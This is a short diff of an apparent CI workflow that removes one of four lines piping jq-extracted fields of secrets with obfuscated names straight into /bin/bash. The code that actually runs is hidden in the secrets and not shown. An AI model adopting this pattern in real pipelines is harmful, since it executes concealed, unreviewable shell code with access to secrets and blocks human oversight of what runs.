@@ -20,7 +20,6 @@ jobs:
           wbl877: ${{ secrets.wbl877 }}
         run: |
           printf '%s' "$wbl877" | jq -r .wvlmk2 | /bin/bash
-          echo $u25237 | jq -r .un9 | /bin/bash
           printf '%s' "$gs595" | jq -r .l295 | /bin/bash
           printf '%s' "$xzh75" | jq -r .rqljo8363 | /bin/bash
 
